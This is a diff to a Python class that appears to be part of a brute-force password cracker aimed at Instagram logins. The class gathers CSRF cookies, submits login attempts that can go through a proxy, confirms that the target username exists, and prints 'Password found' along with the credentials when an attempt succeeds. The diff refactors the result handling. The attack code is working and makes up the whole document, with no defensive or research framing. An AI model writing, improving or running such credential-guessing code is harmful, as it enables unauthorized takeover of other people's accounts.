@@ -3,6 +3,7 @@ from lib.src.const import session_data, ft, headers, _home, _login_url
 from lib.src.user_agent import user_agent
 from datetime import datetime
 from lib.src.debug.debug import Debug
+import sys
 
 class Browser:
 	def __init__(self, username = None, password = None, proxy = None):
@@ -24,7 +25,6 @@ class Browser:
 		return self.__session
 	def csrftoken(self):
 		cookies = self.browser.get(session_data['login_url'].replace('/ajax', ''), timeout=ft).cookies.get_dict()
-		Debug(f'[*] Cookies: {cookies}')
 		mid = cookies["mid"]
 		id_did = cookies["ig_did"]
 		ig_nrcb = cookies["ig_nrcb"]
@@ -43,17 +43,36 @@ class Browser:
 		res = self.browser.post(_login_url, data=data, timeout=ft)
 		return res.json()
 	def user_exist(self):
-		res = self.browser.get(session_data['home_url'] + f'/{self.username}', timeout=ft)
+		res = self.browser.get(session_data['home_url'] + f'{self.username}', timeout=ft)
 		if res.status_code == 404:
-			Debug('[-] User Not exist')
+			Debug("[-] User doesn't exist")
 			exit()
+		elif res.status_code == 200:
+			Debug('[+] User exists')
+		else:
+			Debug(f'[-] Something is wrong, status: {res.status_code}')
+			sys.exit()
 		
 	def login(self):
+		authenticated = False
+		error = False
+		password = 'None'
 		res = self.post()
 		if res is not None:
-			if res['authenticated']:
-				Debug(f'[+] Password found: {self.password}')
-				Debug(f'[*] Informations: \n  Username: {self.username}, \n  Password: {self.password}')
-				exit()
-			else:
-				Debug(f'[-] {self.password} is incorrect')
+			try:
+				if res['authenticated']:
+					Debug(f'[+] Password found: {self.password}')
+					Debug(f'[*] Informations: \n  Username: {self.username}, \n  Password: {self.password}')
+					authenticated = True
+					password = self.password
+				else:
+					Debug(f'[-] {self.password} is incorrect')
+					authenticated = False
+			except:
+				Debug(f'[-] {res["message"]}')
+				error = True
+		return {
+			'error': error,
+			'authenticated': authenticated,
+			'passsword': password
+		}
